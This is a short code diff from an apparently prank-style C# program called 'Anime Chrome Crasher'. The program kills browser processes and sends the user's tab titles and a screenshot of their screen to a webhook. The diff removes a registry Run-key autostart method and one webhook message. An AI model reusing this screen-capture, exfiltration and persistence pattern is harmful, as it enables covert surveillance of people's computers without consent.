@@ -58,14 +58,6 @@ namespace Anime_Chrome_Crasher
             return false;
         }
 
-        public static void AddRegistry()
-        {
-            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
-            {
-                key.SetValue("My Program", "\"" + Application.ExecutablePath + "\"");
-            }
-        }
-
         public static void killWindow(string windowname)
         {
             foreach (var process in Process.GetProcessesByName(windowname))
@@ -86,7 +78,6 @@ namespace Anime_Chrome_Crasher
                 + " has been detected looking at anime.");
             WeebHook.SendMessage(tabs);
             WeebHook.SendImage();
-            WeebHook.SendMessage("This is a screencap of the users primary screen at the time of the incident ");
         }
 
         public static void screenShot()
